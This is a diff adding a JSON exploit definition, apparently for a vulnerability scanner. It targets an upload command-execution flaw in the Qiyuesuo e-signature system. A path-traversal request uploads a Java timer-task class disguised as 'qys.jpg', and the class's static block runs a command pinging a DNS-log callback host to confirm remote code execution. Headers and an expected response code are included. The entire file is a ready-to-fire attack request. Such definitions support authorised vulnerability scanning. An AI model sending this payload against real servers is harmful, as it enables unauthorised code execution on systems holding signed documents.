@@ -1,0 +1,19 @@
+{
+	"name":"契约锁电子签章系统upload命令执行",
+	"tag":"qiyuesuo",
+	"type":"exec",
+	"poc":{
+		"pocGet":"/callback/%2E%2E;/code/upload",
+		"pocPost":"------WebKitFormBoundaryco2lQ5vxCOn9Aq2R\r\nContent-Disposition: form-data; name=\"type\";\r\n\r\nTIMETASK\r\n------WebKitFormBoundaryco2lQ5vxCOn9Aq2R\r\nContent-Disposition: form-data; name=\"file\";filename=\"qys.jpg\"\r\n\r\npackage qiyuesuo;\r\n\r\nimport com.qiyuesuo.utask.java.BaseTimerTask;\r\n\r\npublic class qiyuesuo004 extends BaseTimerTask {\r\n    static {try{Runtime.getRuntime().exec(\"ping -nc 1 {{dnslog}}\");}catch (Exception e){}}\r\n}\r\n------WebKitFormBoundaryco2lQ5vxCOn9Aq2R--",
+		"header":{
+			"Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+			"X-Requested-With":" XMLHttpRequest",
+			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
+			"Connection":" close",
+			"Accept-Encoding":" gzip, deflate",
+			"Content-Type":" multipart/form-data; boundary=----WebKitFormBoundaryco2lQ5vxCOn9Aq2R"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	}
+}
